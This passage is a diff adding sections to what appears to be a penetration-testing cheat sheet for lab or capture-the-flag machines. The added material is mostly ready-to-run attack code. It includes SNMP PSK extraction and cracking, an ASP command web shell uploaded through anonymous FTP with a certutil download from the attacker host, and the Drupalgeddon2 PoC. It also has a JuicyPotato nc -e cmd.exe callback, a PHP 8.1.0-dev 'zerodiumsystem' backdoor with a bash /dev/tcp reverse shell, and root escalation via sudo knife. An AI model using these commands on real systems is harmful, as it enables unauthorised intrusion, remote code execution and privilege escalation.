@@ -40,13 +40,53 @@ mount -t nfs $BoxIP:/export /mnt/nfs -o nolock
 # SNMP
 onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt $BoxIP
 snmpwalk -v2c -c public $BoxIP
+snmpwalk -v1 -c public -On $BoxIP 1.3.6.1.2.1.1 | tee "$BoxDir/loot/snmp-system.txt"
+awk -F' - ' '/IKE VPN password PSK/ {print $2; exit}' "$BoxDir/loot/snmp-system.txt" > "$BoxDir/loot/psk.hash"
 snmp-check $BoxIP
+
+# IKE fingerprinting and IPSec transport mode
+sudo ike-scan -M "$BoxIP" | tee "$BoxDir/loot/ike-scan.txt"
+sudo ss -ulnp | grep ":$IKEPort" || true
+sudo ipsec stop 2>/dev/null || true
+cat > "$BoxDir/ipsec.conf" <<EOF
+config setup
+    uniqueids=no
+    charondebug="ike 2, knl 2, cfg 2"
+
+conn $BoxName
+    keyexchange=ikev1
+    authby=secret
+    type=transport
+    left=%defaultroute
+    right=$BoxIP
+    rightsubnet=$BoxIP[tcp]
+    ike=3des-sha1-modp1024!
+    esp=3des-sha1!
+    auto=start
+EOF
+cat > "$BoxDir/ipsec.secrets" <<EOF
+%any %any : PSK "$Password"
+EOF
+chmod 600 "$BoxDir/ipsec.secrets"
+sudo unshare --mount --propagation private bash -lc \
+  "mount --bind '$BoxDir/ipsec.secrets' /etc/ipsec.secrets && \
+   exec /usr/lib/ipsec/starter --nofork --conf '$BoxDir/ipsec.conf'" \
+  2>&1 | tee "$BoxDir/loot/ipsec-start.txt" &
+sudo ip xfrm policy
+sudo ip xfrm state
+sudo nmap -Pn -n -sT -sV --version-light -p "$OpenPorts" \
+  -oA "$BoxDir/nmap/post-ipsec" "$BoxIP"
 
 # FTP and SMTP
 ftp $BoxIP
 nc $BoxIP 25
 # Check FTP anonymously and show the directory listing
 curl -s ftp://anonymous:@$BoxIP/
+curl --ftp-pasv --user anonymous:anonymous --list-only "ftp://$BoxIP/"
+# Test whether an anonymous FTP write is served by IIS under a different URL path
+printf '%s\n' 'test' | curl --ftp-pasv --user anonymous:anonymous \
+  --upload-file - "ftp://$BoxIP/test.txt"
+curl -sS "http://$BoxIP/upload/test.txt"
 # Test SMTP banner and supported commands
 nc -nv $BoxIP 25
 nikto -host http://$BoxIP -Tuning b
@@ -55,7 +95,7 @@ dnsrecon -d $Domain -t std
 smtp-user-enum -M RCPT -U $Userlist -D $Domain -t $BoxIP
 ```
 
-<!-- TODO --> <!-- Add compact PostgreSQL and SNMP-specific service triage commands. -->
+<!-- TODO --> <!-- Add compact PostgreSQL-specific service triage commands. -->
 
 ## 2. WEB ENUMERATION
 
@@ -248,6 +288,29 @@ curl -s -X POST "http://$BoxIP/$UploadPath" -F "file=@$BoxDir/$Archive" -F "subm
 unzip -l $BoxDir/$Archive
 ```
 
+### ANONYMOUS FTP TO IIS CLASSIC ASP
+
+```bash
+# Confirm the FTP root to IIS URL mapping with a harmless marker
+printf '%s\n' 'test' | curl --ftp-pasv --user anonymous:anonymous \
+  --upload-file - "ftp://$BoxIP/test.txt"
+curl -sS "http://$BoxIP/upload/test.txt"
+
+# Upload a minimal classic ASP command shell after the mapping is confirmed
+cat > "$BoxDir/www/cmd.asp" <<'EOF'
+<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
+EOF
+curl --ftp-pasv --user anonymous:anonymous \
+  --upload-file "$BoxDir/www/cmd.asp" "ftp://$BoxIP/cmd.asp"
+curl -sS -G --data-urlencode 'cmd=whoami' \
+  "http://$BoxIP/upload/cmd.asp"
+
+# Transfer a reviewed Windows binary through the confirmed ASP shell
+curl -sS -G --data-urlencode \
+  "cmd=certutil.exe -urlcache -split -f http://$LocalIP:$ListenPort/$File C:\\Windows\\Temp\\$File" \
+  "http://$BoxIP/upload/cmd.asp"
+```
+
 ### Custom dotfile and SSH-key exposure
 
 ```bash
@@ -376,6 +439,23 @@ grep malicious.js $BoxDir/loot/callback.log
 <!-- TODO --> <!-- Add PostgreSQL COPY, MSSQL xp_cmdshell, MySQL file-write, and blind SQLi command patterns. -->
 
 ## 5. FOOTHOLD: PUBLIC EXPLOITS
+
+### Drupal 7.54 / Drupalgeddon2
+
+~~~bash
+# Confirm the public version disclosure and locate the matching PoC
+curl -sS "http://$BoxIP/CHANGELOG.txt" | grep -m1 "Drupal"
+searchsploit "Drupal 7"
+searchsploit -x php/webapps/44449.rb
+
+# Copy, minimally adapt, and syntax-check the reviewed Ruby PoC
+boxset ExploitFile "$BoxDir/exploits/44449.rb"
+cp /usr/share/exploitdb/exploits/php/webapps/44449.rb "$ExploitFile"
+sed -i "/require 'highline\/import'/d" "$ExploitFile"
+sed -i 's/try_phpshell = true/try_phpshell = false/' "$ExploitFile"
+ruby -c "$ExploitFile"
+ruby "$ExploitFile" "http://$BoxIP/"
+~~~
 
 ```bash
 # Search by product and version
@@ -699,6 +779,11 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 # Test and launch JuicyPotato from a token with SeImpersonatePrivilege
 $PotatoPath -z -l $PotatoPort -c $CLSID
 $PotatoPath -t * -p $PayloadPath -l $PotatoPort -c $CLSID
+
+# JuicyPotato callback through cmd.exe; keep the callback port separate from -l
+$PotatoPath -l $PotatoPort -p $CmdPath \
+  -a "/c $NcPath $LocalIP $Port2 -e cmd.exe" \
+  -t * -c $CLSID
 ```
 
 <!-- TODO --> <!-- Add concise token, DLL hijack, registry, AlwaysInstallElevated, and named-pipe branches. -->
@@ -850,6 +935,8 @@ netexec smb $BoxIP -u $Username -p $Password --continue-on-success
 # Hash identification and cracking
 hashid $Hash
 john --wordlist=$Wordlist $HashFile
+john --format=raw-md5 --wordlist="$Wordlist" "$BoxDir/loot/psk.hash"
+boxset Password "$(john --show --format=raw-md5 "$BoxDir/loot/psk.hash" | awk -F: 'NR==1 {print $2; exit}')"
 hashcat -m 1000 -a 0 $HashFile $Wordlist
 hashcat -m 5600 $HashFile $Wordlist
 keepass2john $File > $HashFile
@@ -1047,6 +1134,10 @@ fc /b C:\Users\$Username\job-original.bat C:\Path\to\task-script.bat
 ```bash
 # Verify a removed webshell returns 404
 curl -s -o /dev/null -w "%{http_code}" http://$BoxIP/$Path
+# Remove files from an anonymous FTP upload root after confirming the exact paths
+curl --ftp-pasv --user anonymous:anonymous --quote "DELE $RemoteFile" "ftp://$BoxIP/"
+sudo ipsec stop 2>/dev/null || true
+pkill -f "python3 -m http.server $ListenPort" 2>/dev/null || true
 boxdone
 md5sum $File
 ```
@@ -1069,3 +1160,27 @@ uname -m && file /bin/bash
 
 - https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
 - https://www.revshells.com/
+
+## 17. KNIFE: PHP 8.1.0-dev BACKDOOR AND CHEF SUDO
+
+```bash
+# Preserve the header evidence and prove the development-build backdoor safely.
+curl -sSI "http://$BoxIP:$WebPort/" | tee "$BoxDir/loot/headers.txt"
+curl -fsS -H 'User-Agentt: zerodiumsystem("id");' \
+  "http://$BoxIP:$WebPort/" | grep -m1 'uid='
+
+# Receive the Bash callback after the identity proof succeeds.
+nc -lvnp "$Lport"
+curl --max-time 10 -fsS \
+  -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1'\");" \
+  "http://$BoxIP:$WebPort/" >/dev/null
+
+# Knife is a Ruby-capable sudo target; use the exact path shown by sudo -l.
+sudo -l
+knife --version
+sudo /usr/bin/knife exec -E 'exec "/bin/bash"'
+id
+whoami
+```
+
+The header name has two `t` characters. Prove `id` before requesting a callback, stabilise the callback with the Linux shell page, and keep the root proof private.
